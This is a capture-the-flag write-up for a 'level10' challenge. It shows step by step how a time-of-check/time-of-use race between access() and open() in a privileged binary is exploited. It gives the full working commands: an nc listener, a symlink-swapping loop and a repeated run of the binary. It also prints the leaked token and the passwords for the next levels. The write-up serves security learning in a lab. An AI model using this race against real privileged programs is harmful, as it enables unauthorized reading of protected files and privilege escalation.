We have to file, one token which we can't read beacuse only the owner `flag10` has read access, and a binary file that we can execute.
Using ghidra, and the usage, this programm require a file and a host.
Regarding of the host, we will use 0.0.0.0 as it will connect to every IPV4 of the machine
While decompiling the main of the binary file, we see the main issue :
First the program will check if the file passed as `argv[1]` can be accessed by the real user (in our case `level10`), and after that, the same programm will try to open the file.
Our goal is to trick the program to think that our `argv[1]` is our file, but in the end, it is the file `token`.
Furthermore, we need to stay connected to the socket opened by the program since the content of the readed file will be outputed there.
We will be doing so by using nc : `nc -kl 6969`
To trick our program, we will first create our file : `echo "Hello" > /tmp/our_file`
Next, we will create a symbolic link, linking altenatively `/tmp/our_file` and `/home/user/level10/token`.
We will be doing so by having a second shell running this command : 
`while true; do ln -sf /tmp/our_file /tmp/link; ln -fs /home/user/level10/token /tmp/link; done`
The `f` option will overide any existing symbolic link.
To be sure to have : 
-First a link to our file to pass the `acces()` checkpoint
-Second a link to the file `token` when the program will try to open it,
we will run this command in a third shell :
`while true; do ./level10 /tmp/link 0.0.0.0; done`
In the shell whose listening to the socket, we will se 2 different ouptut :
First :
```
.*( )*.
Hello
```
Second :
```
.*( )*.
woupa2yuojeeaaed06riuj63c
```
The second one is the password to connect as flag10:
```
su flag10
woupa2yuojeeaaed06riuj63c
```

```
su level11
feulo4b72j7edeahuete3no7c
```
